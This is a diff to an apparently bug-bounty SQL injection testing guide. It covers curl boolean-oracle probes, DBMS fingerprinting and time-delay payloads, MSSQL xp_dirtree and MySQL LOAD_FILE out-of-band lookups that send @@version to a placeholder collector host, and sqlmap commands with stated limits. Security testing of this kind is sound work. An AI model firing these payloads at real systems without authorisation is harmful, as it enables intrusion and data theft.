@@ -24,18 +24,26 @@ U="https://$H/api/items?id=7"
 curl -sk "$U"                      -o b0.txt -w '%{http_code} %{size_download} %{time_total}\n'
 curl -sk "${U}'"                   -o b1.txt -w '%{http_code} %{size_download} %{time_total}\n'
 curl -sk "${U}''"                  -o b2.txt -w '%{http_code} %{size_download} %{time_total}\n'
+curl -sk --get --data-urlencode "id=7' AND '1'='1" "https://$H/api/items" -o t1.txt
+curl -sk --get --data-urlencode "id=7' AND '1'='2" "https://$H/api/items" -o t2.txt
 diff b0.txt b1.txt >/dev/null || echo "single quote CHANGED the response"
-diff b0.txt b2.txt >/dev/null && echo "balanced quotes RESTORED it - classic string context"
+if diff b0.txt t1.txt >/dev/null && ! diff t1.txt t2.txt >/dev/null; then
+  echo "AND-true matches baseline, AND-false does not - classic string context"
+fi
 ```
 
-One quote breaks it and two quotes fix it: that is a string-context injection, and it is a
-stronger signal than any error message.
+One quote breaks it and a balanced pair makes the **error go away**: that is the string-context
+tell, and it is stronger than any error message. Read `b2` for the *error*, not for the body -
+`id=7''` builds the literal `'7'''`, i.e. the value `7'`, a valid query that matches no row, so
+its body is the empty/not-found page and can never diff-equal the baseline. The body oracle is
+the `AND '1'='1` / `AND '1'='2` pair above, whose true side re-selects the original row.
 
 **2. Boolean oracle - the workhorse.** Two payloads that must differ from each other and
 match the expected side.
 
 ```bash
-for p in "7 AND 1=1" "7 AND 1=2" "7' AND '1'='1" "7' AND '1'='2" "7 OR 1=1" "7)%20AND%20(1=1"; do
+for p in "7 AND 1=1" "7 AND 1=2" "7' AND '1'='1" "7' AND '1'='2" "7 OR 1=1" \
+         "7) AND (1=1" "7) AND (1=2"; do
   printf '%-22s ' "$p"
   curl -sk --get --data-urlencode "id=$p" "https://$H/api/items" \
     | wc -c
@@ -45,15 +53,35 @@ done
 `1=1` returns the baseline size and `1=2` returns a different one -> confirmed. If both
 differ from baseline identically, you are looking at an error, not an oracle.
 
+**Never pre-encode a payload you hand to `--data-urlencode`.** It encodes the `%` as well, so
+`"7)%20AND%20(1=1"` leaves as `id=7%29%2520AND%2520%281%3d1` and the app decodes it back to the
+literal string `7)%20AND%20(1=1`. The DBMS never sees `AND` - you measured a syntax error and
+called it a boolean test. Write literal spaces and let curl encode them as `+`.
+
 **3. Fingerprint the DBMS - it picks every later payload.**
 
-| DBMS | Version probe (string concat) | Time delay | Comment |
+| DBMS | Version probe (UNION - needs the step-4 column count) | Time delay | Comment |
 |---|---|---|---|
 | MySQL/MariaDB | `' AND 1=0 UNION SELECT @@version-- -` | `' AND SLEEP(5)-- -` | `-- -`, `#`, `/**/` |
 | PostgreSQL | `' AND 1=0 UNION SELECT version()--` | `'; SELECT pg_sleep(5)--` | `--` |
 | MSSQL | `' AND 1=0 UNION SELECT @@version--` | `'; WAITFOR DELAY '0:0:5'--` | `--`, `/**/` |
 | Oracle | `' AND 1=0 UNION SELECT banner FROM v$version--` | `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--` | `--`, needs `FROM dual` |
 | SQLite | `' AND 1=0 UNION SELECT sqlite_version()--` | no sleep - use heavy `randomblob()` | `--` |
+
+Those version probes are `UNION` probes, and a `UNION` returns nothing until the column count and
+types match the original `SELECT` - which is step 4. On a multi-column endpoint every row above
+answers with a generic error, so **fingerprint with the boolean oracle first**. Each of these is
+baseline-vs-error, and the function simply failing to parse is the answer:
+
+```
+MySQL/MariaDB  7' AND @@version LIKE '%'-- -       (then '%MariaDB%' to split the fork)
+MSSQL          7' AND @@VERSION LIKE '%Microsoft%'--
+PostgreSQL     7' AND version() LIKE '%PostgreSQL%'--
+Oracle         7' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--
+SQLite         7' AND sqlite_version() LIKE '3%'--
+```
+
+Baseline response back = that DBMS. Error or empty = the wrong DBMS, or the wrong context.
 
 Error-text tells when you get them: `You have an error in your SQL syntax` MySQL ·
 `unterminated quoted string` PostgreSQL · `Unclosed quotation mark` MSSQL ·
@@ -91,7 +119,13 @@ Interleave the samples (as above) so a slow network minute cannot fake a result.
 
 ```
 MySQL  (Windows):  ' AND LOAD_FILE(CONCAT('\\\\',@@version,'.oob.<collector>\\a'))-- -
-MSSQL:             '; EXEC master..xp_dirtree '\\'+@@version+'.oob.<collector>\a'--
+MSSQL:             '; DECLARE @q varchar(1024); SET @q='\\'+REPLACE(REPLACE(
+                   SUBSTRING(@@version,1,40),' ','_'),CHAR(10),'_')+'.oob.<collector>\a';
+                   EXEC master..xp_dirtree @q--
+                   T-SQL accepts no expression as an EXEC argument - `EXEC p 'a'+@@version` dies
+                   on the parser ("Incorrect syntax near +"), so build the string in a variable
+                   first. `@@version` is multi-line and full of spaces and parens, so trim and
+                   substitute before any of it can be a DNS label.
 PostgreSQL:        no safe OOB primitive - `COPY ... TO PROGRAM` is OS command execution on
                    the DB server, which is past this skill's stop point. Use the boolean or
                    timing oracle instead, and route any command-execution path to zp-rce-ssti.
@@ -138,11 +172,15 @@ probes miss it entirely.
 
 ```bash
 sqlmap -u "https://$H/api/items?id=7" --batch --level 2 --risk 1 \
-       --technique=BEUST --banner --current-user --current-db \
+       --technique=BEUT --banner --current-user --current-db \
        --delay 1 --threads 1 --timeout 15
 # from a saved request, which handles auth and JSON properly
 sqlmap -r req.txt --batch --level 2 --risk 1 --banner
 ```
+
+`S` (stacked queries) is left out of `--technique` deliberately - it executes a second statement,
+which is exactly what the hand-off rule below says to report rather than exercise, and it is the
+technique `--os-shell` and `--file-read` reach through. Use `BEU` if timing is unreliable.
 
 **Never** `--dump`, `--dump-all`, `--os-shell`, `--file-read`, `--risk 3`, or `--tamper` on a
 live bounty target. `--risk 3` includes `OR`-based payloads that can update or delete rows.
